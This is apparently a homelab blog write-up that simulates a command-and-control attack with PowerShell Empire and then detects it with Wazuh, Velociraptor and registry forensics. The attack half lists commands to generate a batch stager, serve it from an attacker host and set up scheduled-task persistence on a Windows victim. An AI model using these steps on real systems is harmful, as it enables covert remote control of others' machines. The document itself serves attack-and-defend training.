---
{"dg-publish":true,"permalink":"/simulating-command-and-control-attack-and-defend/"}
---

[[Homelab Topology\|Homelab Topology]]
### Introduction
---
Command and Control also known as C2 is the base operation of a threat actor, this is where the attacker sends instructions to the compromised host, instructions could be anything such as exfiltrating sensitive information, establishing ransomware, and use the compromised machine to attack other machine, anything that the attacker wants.
## Prerequisites
---
- Velociraptor installed both server and client. [Install Velociraptor Server in Ubuntu](https://www.atlantic.net/dedicated-server-hosting/how-to-install-and-configure-velociraptor-on-ubuntu/)
- Windows VM.
- Kali Linux.
- Windows Server with Active Directory installed.
- Forensic Workstation: FlareVM and Remnux.
- Wazuh Installed
# Modules

Powershell-empire basics:

```C
sudo powershell-empire server
```

Create a listener:

```C
sudo powershell-empire client
(Empire:) > uselistener http
```

![Pasted image 20240928195850.png](/img/user/images/Pasted%20image%2020240928195850.png)
Then create a stager:

```C
(Empire: uselistener/http) > usestager windows_launcher_bat
(Empire: usestager/windows_launcher_bat) > set Listener http1
INFO: Set Listener to http1 
(Empire: usestager/windows_launcher_bat) > execute
INFO: launcher.bat written to /var/lib/powershell-empire/empire/client/generated-stagers/launcher.bat
```

Then serve it to the compromised machine via simple python server:

```C
cd /var/lib/powershell-empire/empire/client/generated-stagers
python3 -m http.server
```

Navigate to `http://<KALI_IP>:8000/`:

![Pasted image 20240928200633.png](/img/user/images/Pasted%20image%2020240928200633.png)
Download and execute the file (launcher will delete itself after execution), back to the kali linux:

![Pasted image 20240929162604.png](/img/user/images/Pasted%20image%2020240929162604.png)
Another screenshot:

![Pasted image 20240929162748.png](/img/user/images/Pasted%20image%2020240929162748.png)
Then we can use the command `interact <name>` to get a shell and to establish persistence:

```bash
usemodule powershell_persistence_userland_schtasks
set Listner http1
execute
```

Command Output:
![Pasted image 20240929163124.png](/img/user/images/Pasted%20image%2020240929163124.png)
# Analysis

At Wazuh:

![Pasted image 20240929163343.png](/img/user/images/Pasted%20image%2020240929163343.png)
However the problem is registry modifications and network connection was not logged, investigating further with Velociraptor:

![Pasted image 20240929165529.png](/img/user/images/Pasted%20image%2020240929165529.png)
In Velociraptor sidebar: "Hunt Manager > New Hunt > Fill Details" then choose and skip to launch:

![Pasted image 20240929165901.png](/img/user/images/Pasted%20image%2020240929165901.png)
Then run it and should see something like this after it is finishing hunting:

![Pasted image 20240929170049.png](/img/user/images/Pasted%20image%2020240929170049.png)
Then find the culprit:

![Pasted image 20240929170618.png](/img/user/images/Pasted%20image%2020240929170618.png)
- Suspicious arguments
- Use of base64
- Task name: Updater.

Now collecting and analysing forensic artificats with Velociraptor's built in plugin KAPE:

![Pasted image 20240929171007.png](/img/user/images/Pasted%20image%2020240929171007.png)
Then at the configure parameter select:

![Pasted image 20240929171120.png](/img/user/images/Pasted%20image%2020240929171120.png)
Then back at the same Window run the hunt and at the bottom there should be a download button:

![Pasted image 20240929171455.png](/img/user/images/Pasted%20image%2020240929171455.png)
Then I am going to open up FlareVM and analyse it with RegistryExplorer by Eric Zimmerman:

The registry hive we want is the compromised user's NTUSER.dat:

![Pasted image 20240929175654.png](/img/user/images/Pasted%20image%2020240929175654.png)
Then we can find it via `SOFTWARE/Microsoft/Windows/CurrentVersion`:

![Pasted image 20240929180729.png](/img/user/images/Pasted%20image%2020240929180729.png)
**Why here?**
- This place usually is for system configuration.
- Not the usual place blue teamers will look for such as in Registry: Run, RunOnce and more.

The decoded base64 is:

![Pasted image 20240929180936.png](/img/user/images/Pasted%20image%2020240929180936.png)
And the encoded base64 from the decoded is:

![Pasted image 20240929181006.png](/img/user/images/Pasted%20image%2020240929181006.png)

Knowing the file location we can simply delete it now.
























